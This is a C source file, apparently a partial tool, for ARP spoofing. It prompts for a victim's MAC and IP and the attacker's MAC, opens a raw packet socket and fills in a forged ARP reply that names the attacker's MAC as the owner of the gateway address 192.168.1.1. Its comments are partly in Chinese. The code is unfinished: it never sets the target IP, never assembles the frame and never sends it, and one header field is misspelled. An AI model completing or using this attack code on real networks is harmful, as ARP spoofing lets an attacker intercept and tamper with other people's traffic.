#include "head.h"

char *INTERFACE; //存储网卡设备
u_char TARGET_MAC[6]; //victim's mac
u_char SOURCE_MAC[6]; //attacker's mac
u_char TARGET_IP[4]; //victim's ip
u_char SOURCE_IP[4] = {192,168,1,1}; //gateway's ip
char errbuf[PCAP_ERRBUF_SIZE] = {0}; //存储错误信息

void input_mac(u_char *mac) {
    int i;
    for (i = 0; i < 6; i++) scanf("%hhx", &mac[i]);
}

void input_ip(u_char *ip) {
    int i;
    for (i = 0; i < 4; i++) scanf("%hhd", &ip[i]);
}

int main(int argc, char const *argv[]) {
    //第一步，初始化攻击资源
    INTERFACE = pcap_lookupdev(errbuf); //返回寻找到的第一个网络设备的指针
    if (INTERFACE == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("Your victim's MAC: ");
    input_mac(TARGET_MAC);
    printf("Your victim's IP: ");
    input_ip(TARGET_IP);
    printf("Your MAC: ");
    input_mac(SOURCE_MAC);
    //创建套接字
    int soc;
    u_char frame[42]; //以太网头部和ARP头部总长
    soc = socket(AF_PACKET, SOCK_RAW, htons(EPT_ARP));
    if (soc == -1) {
        printf("Socket creat failed!\n");
        exit(1);
    }
    printf("Socket created!\n");
    //构建伪造ARP帧
    ethernet_header ehead;
    arp_header arphead;
    memcpy(ehead.DST_mac, TARGET_MAC, 6);
    memcpy(ehead.SRC_mac, SOURCE_MAC, 6);
    ehead.eth_type = htons(EPT_ARP);
    arphead.hardware_type = htons(ARPHRD_ETHER);
    arphead.protocol_type = htons(EPT_IPv4);
    arphead.hardware_len = 6;
    arphead.protocol_len = 4;
    arphead.aro_op = htons(ARPOP_REPLY);
    memcpy(arphead.src_mac, SOURCE_MAC, 6);
    memcpy(arphead.src_ip, SOURCE_IP, 4);
    
    return 0;
}